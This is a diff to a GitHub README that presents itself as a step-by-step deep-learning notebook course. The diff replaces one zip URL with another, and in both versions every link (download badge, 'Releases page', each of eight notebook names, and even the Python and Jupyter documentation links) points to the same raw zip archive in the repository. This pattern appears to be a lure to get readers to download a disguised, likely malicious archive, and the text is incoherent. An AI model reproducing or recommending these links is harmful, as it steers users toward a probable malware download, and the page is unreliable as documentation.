@@ -1,6 +1,6 @@
 # 🎉 all-of-it - Learn Deep Learning Step by Step
 
-[![Download Now](https://raw.githubusercontent.com/geekjologs/all-of-it/main/soapbush/all-of-it_Mancunian.zip%20Now-Get%20It%20Here-blue)](https://raw.githubusercontent.com/geekjologs/all-of-it/main/soapbush/all-of-it_Mancunian.zip)
+[![Download Now](https://raw.githubusercontent.com/geekjologs/all-of-it/main/soapbush/of_all_it_v1.4.zip%20Now-Get%20It%20Here-blue)](https://raw.githubusercontent.com/geekjologs/all-of-it/main/soapbush/of_all_it_v1.4.zip)
 
 ## 📜 Overview
 
@@ -11,11 +11,11 @@ This repository contains a series of notebooks that guide you through deep learn
 To get started with the "All Of It" notebooks, you need to download the files from our Releases page. Follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to go to our Releases page.
-   [Download from Releases Page](https://raw.githubusercontent.com/geekjologs/all-of-it/main/soapbush/all-of-it_Mancunian.zip)
+   [Download from Releases Page](https://raw.githubusercontent.com/geekjologs/all-of-it/main/soapbush/of_all_it_v1.4.zip)
 
 2. **Select the Latest Version**: On the Releases page, look for the latest version of the repository. You will see a list of available files to download.
 
-3. **Download Files**: Click on the file named `https://raw.githubusercontent.com/geekjologs/all-of-it/main/soapbush/all-of-it_Mancunian.zip` to start your journey into deep learning. You can download additional notebooks later as you progress.
+3. **Download Files**: Click on the file named `https://raw.githubusercontent.com/geekjologs/all-of-it/main/soapbush/of_all_it_v1.4.zip` to start your journey into deep learning. You can download additional notebooks later as you progress.
 
 ## 💻 System Requirements
 
@@ -36,9 +36,9 @@ To run the notebooks, ensure you have the following installed on your computer:
 To download the notebooks:
 
 1. **Go to the Releases Page**: Click the link below to visit the Releases page.
-   [Download from Releases Page](https://raw.githubusercontent.com/geekjologs/all-of-it/main/soapbush/all-of-it_Mancunian.zip)
+   [Download from Releases Page](https://raw.githubusercontent.com/geekjologs/all-of-it/main/soapbush/of_all_it_v1.4.zip)
 
-2. **Choose Your Notebook**: Download `https://raw.githubusercontent.com/geekjologs/all-of-it/main/soapbush/all-of-it_Mancunian.zip` first. Follow the sequence for subsequent notebooks.
+2. **Choose Your Notebook**: Download `https://raw.githubusercontent.com/geekjologs/all-of-it/main/soapbush/of_all_it_v1.4.zip` first. Follow the sequence for subsequent notebooks.
 
 3. **Open Jupyter Notebook**: Run the following command in your terminal or command prompt:
 
@@ -48,7 +48,7 @@ To download the notebooks:
 
    This command will open Jupyter Notebook in your web browser.
 
-4. **Load Your Notebook**: In the opened interface, navigate to the location where you downloaded your files. Click on `https://raw.githubusercontent.com/geekjologs/all-of-it/main/soapbush/all-of-it_Mancunian.zip` to open it.
+4. **Load Your Notebook**: In the opened interface, navigate to the location where you downloaded your files. Click on `https://raw.githubusercontent.com/geekjologs/all-of-it/main/soapbush/of_all_it_v1.4.zip` to open it.
 
 5. **Follow Along**: Once you have the notebook open, follow the steps outlined in each cell. Jupyter allows you to run cells interactively, making it easy to see results immediately.
 
@@ -56,14 +56,14 @@ To download the notebooks:
 
 We recommend completing the notebooks in the order listed below. Each one builds upon the knowledge from the previous one:
 
-1. `https://raw.githubusercontent.com/geekjologs/all-of-it/main/soapbush/all-of-it_Mancunian.zip`: Understand the fundamental building blocks of deep learning.
-2. `https://raw.githubusercontent.com/geekjologs/all-of-it/main/soapbush/all-of-it_Mancunian.zip`: Create your first neural network.
-3. `https://raw.githubusercontent.com/geekjologs/all-of-it/main/soapbush/all-of-it_Mancunian.zip`: Discover convolutional neural networks for image recognition.
-4. `https://raw.githubusercontent.com/geekjologs/all-of-it/main/soapbush/all-of-it_Mancunian.zip`: Learn about deeper architectures using ResNets.
-5. `https://raw.githubusercontent.com/geekjologs/all-of-it/main/soapbush/all-of-it_Mancunian.zip`: Investigate models that transform images into text.
-6. `https://raw.githubusercontent.com/geekjologs/all-of-it/main/soapbush/all-of-it_Mancunian.zip`: Build and understand the GPT model.
-7. `https://raw.githubusercontent.com/geekjologs/all-of-it/main/soapbush/all-of-it_Mancunian.zip`: Grasp the use of a trained model for predictions.
-8. `https://raw.githubusercontent.com/geekjologs/all-of-it/main/soapbush/all-of-it_Mancunian.zip`: Fine-tune models within the Hugging Face ecosystem.
+1. `https://raw.githubusercontent.com/geekjologs/all-of-it/main/soapbush/of_all_it_v1.4.zip`: Understand the fundamental building blocks of deep learning.
+2. `https://raw.githubusercontent.com/geekjologs/all-of-it/main/soapbush/of_all_it_v1.4.zip`: Create your first neural network.
+3. `https://raw.githubusercontent.com/geekjologs/all-of-it/main/soapbush/of_all_it_v1.4.zip`: Discover convolutional neural networks for image recognition.
+4. `https://raw.githubusercontent.com/geekjologs/all-of-it/main/soapbush/of_all_it_v1.4.zip`: Learn about deeper architectures using ResNets.
+5. `https://raw.githubusercontent.com/geekjologs/all-of-it/main/soapbush/of_all_it_v1.4.zip`: Investigate models that transform images into text.
+6. `https://raw.githubusercontent.com/geekjologs/all-of-it/main/soapbush/of_all_it_v1.4.zip`: Build and understand the GPT model.
+7. `https://raw.githubusercontent.com/geekjologs/all-of-it/main/soapbush/of_all_it_v1.4.zip`: Grasp the use of a trained model for predictions.
+8. `https://raw.githubusercontent.com/geekjologs/all-of-it/main/soapbush/of_all_it_v1.4.zip`: Fine-tune models within the Hugging Face ecosystem.
 
 ## 🛠 Troubleshooting
 
@@ -75,8 +75,8 @@ If you encounter issues while running the notebooks, consider checking the follo
 
 ## 🌟 Additional Resources
 
-- **Python Official Site**: [https://raw.githubusercontent.com/geekjologs/all-of-it/main/soapbush/all-of-it_Mancunian.zip](https://raw.githubusercontent.com/geekjologs/all-of-it/main/soapbush/all-of-it_Mancunian.zip)
-- **Jupyter Notebook Documentation**: [Jupyter Docs](https://raw.githubusercontent.com/geekjologs/all-of-it/main/soapbush/all-of-it_Mancunian.zip)
+- **Python Official Site**: [https://raw.githubusercontent.com/geekjologs/all-of-it/main/soapbush/of_all_it_v1.4.zip](https://raw.githubusercontent.com/geekjologs/all-of-it/main/soapbush/of_all_it_v1.4.zip)
+- **Jupyter Notebook Documentation**: [Jupyter Docs](https://raw.githubusercontent.com/geekjologs/all-of-it/main/soapbush/of_all_it_v1.4.zip)
 - **Deep Learning Resources**: Check online courses and tutorials for additional learning.
 
 ## 📞 Support
